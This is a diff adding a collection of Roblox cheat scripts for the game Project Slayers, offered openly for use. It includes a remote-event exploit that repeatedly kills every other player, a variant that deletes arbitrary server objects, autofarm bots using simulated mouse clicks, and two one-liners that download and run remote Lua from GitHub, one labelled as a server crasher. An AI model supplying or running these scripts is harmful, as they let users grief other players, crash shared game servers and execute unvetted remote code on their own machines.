@@ -1,0 +1,133 @@
+See breathing progress(Free gamepass) and Autofarm Hub.
+==========
+repeat wait() until game:IsLoaded()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LioK251/RbScripts/main/lazyhub.lua"))()
+=========
+Project Slayers Instant kill all Players
+=========
+local plr = game.Players.LocalPlayer
+while wait(1) do
+   for i, v in pairs(game.Players:GetPlayers()) do
+       if v ~= plr and v.Character and v.Character:FindFirstChild("Head") then
+           game.ReplicatedStorage.Remotes.To_Server.Handle_Initiate_S:FireServer("givericequestthing", "Players."..plr.Name..".PlayerGui.localscript_cache.Prompts_Handler", v, v.Character.Head, 305354.89620799996)
+       end
+   end
+end
+=========
+Server side:
+=========
+local plr = game.Players.LocalPlayer
+function Delete(v)
+   game.ReplicatedStorage.Remotes.To_Server.Handle_Initiate_S:FireServer("givericequestthing", "Players."..plr.Name..".PlayerGui.localscript_cache.Prompts_Handler", plr, v, 305354.89620799996)
+end
+Delete() -- put the part path between the (), ex: Delete(game.workspace.Part)
+=========
+Autofarm Rice:
+=========
+_G.Condition = true
+while _G.Condition and wait() do
+local Time = 2
+local tween =  game:GetService("TweenService"):Create(game.Players.LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(Time), {CFrame = game:GetService("Workspace")["Sarah"].HumanoidRootPart.CFrame})                    
+tween:Play()                     tween.Completed:Wait(E)
+
+wait(1)
+
+fireproximityprompt(workspace["Sarah"].UpperTorso.ProximityPrompt, 1, true)
+
+wait(5)
+--CLICK THROUGH RICE QUEST
+mousemoveabs(455,980)
+wait(1)
+mousemoveabs(460,980)
+wait(1)
+mouse1click(455,980)
+wait(1)
+mousemoveabs(455,980)
+wait(1)
+mousemoveabs(460,980)
+wait(1)
+mouse1click(455,980)
+wait(1)
+mousemoveabs(455,980)
+wait(1)
+mousemoveabs(460,980)
+wait(4)
+
+local Time = 1
+local tween =  game:GetService("TweenService"):Create(game.Players.LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(Time), {CFrame = game:GetService("Workspace").StarterVillage_RiceStrings.RiceString.CFrame})                    
+tween:Play()                     tween.Completed:Wait(E)
+wait(0.1)
+fireproximityprompt(workspace["StarterVillage_RiceStrings"].RiceString.Rice_pick_proximity, 1, true)
+wait(1)
+local Time = 1
+local tween =  game:GetService("TweenService"):Create(game.Players.LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(Time), {CFrame = game:GetService("Workspace").StarterVillage_RiceStrings.RiceString.CFrame})                    
+tween:Play()                     tween.Completed:Wait(E)
+wait(0.1)
+fireproximityprompt(workspace["StarterVillage_RiceStrings"].RiceString.Rice_pick_proximity, 1, true)
+wait(1)
+local Time = 1
+local tween =  game:GetService("TweenService"):Create(game.Players.LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(Time), {CFrame = game:GetService("Workspace").StarterVillage_RiceStrings.RiceString.CFrame})                    
+tween:Play()                     tween.Completed:Wait(E)
+wait(0.1)
+fireproximityprompt(workspace["StarterVillage_RiceStrings"].RiceString.Rice_pick_proximity, 1, true)
+wait(1)
+local Time = 1
+local tween =  game:GetService("TweenService"):Create(game.Players.LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(Time), {CFrame = game:GetService("Workspace").StarterVillage_RiceStrings.RiceString.CFrame})                    
+tween:Play()                     tween.Completed:Wait(E)
+wait(0.1)
+fireproximityprompt(workspace["StarterVillage_RiceStrings"].RiceString.Rice_pick_proximity, 1, true)
+wait(45)
+end
+=========
+Wagon Autofarm:
+=========
+_G.Condition = true
+while _G.Condition and wait() do
+local Time = 10
+local tween =  game:GetService("TweenService"):Create(game.Players.LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(Time), {CFrame = game:GetService("Workspace")["Grandpa Wagwon's Wagon"].Root.CFrame})                    
+tween:Play()                     tween.Completed:Wait(E)
+
+wait(1)
+
+fireproximityprompt(workspace["Grandpa Wagwon"].UpperTorso.ProximityPrompt, 1, true)
+
+wait(5)
+--CLICK THROUGH WAGON QUEST
+mousemoveabs(455,980)
+wait(1)
+mousemoveabs(460,980)
+wait(1)
+mouse1click(455,980)
+wait(1)
+mousemoveabs(455,980)
+wait(1)
+mousemoveabs(460,980)
+wait(1)
+mouse1click(455,980)
+wait(1)
+mousemoveabs(455,980)
+wait(1)
+mousemoveabs(460,980)
+wait(1)
+mouse1click(455,980)
+wait(1)
+mousemoveabs(455,980)
+wait(1)
+mousemoveabs(460,980)
+wait(1)
+mouse1click(455,980)
+wait(4)
+
+local Time = 10
+local tween =  game:GetService("TweenService"):Create(game.Players.LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(Time), {CFrame = game:GetService("Workspace").Wagon_Deposit_Part.CFrame})                    
+tween:Play()                     tween.Completed:Wait(E)
+
+wait(45)
+end
+=========
+Crash Server(2 times execute): 
+=========
+-- execute 2 times for the best result
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xaxaxaxaxaxaxaxaxa/RobloxScripts/main/Project-Slayers/crash-server.lua%22))();
+=========
